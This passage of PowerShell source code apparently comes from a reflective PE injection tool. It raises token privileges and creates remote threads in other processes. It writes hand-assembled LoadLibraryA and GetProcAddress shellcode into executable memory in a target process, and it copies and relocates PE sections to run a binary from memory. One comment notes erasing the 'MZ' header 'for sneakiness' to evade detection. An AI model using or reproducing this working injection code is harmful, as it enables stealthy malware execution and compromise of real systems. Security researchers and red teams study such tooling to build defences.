		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
